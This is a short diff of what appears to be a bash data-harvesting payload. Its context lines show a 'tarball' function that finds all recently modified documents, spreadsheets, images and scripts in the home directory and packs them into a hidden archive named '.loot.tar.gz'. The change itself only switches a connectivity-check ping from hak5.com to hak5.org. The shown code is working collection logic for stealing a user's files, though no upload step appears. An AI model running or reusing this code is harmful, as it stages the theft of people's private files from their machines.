@@ -29,7 +29,7 @@ tarball() {
     find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -czf ~/.loot.tar.gz --null -T -
 }
 net_check() {
-    ping -c 1 hak5.com
+    ping -c 1 hak5.org
 }
 
 if net_check; then
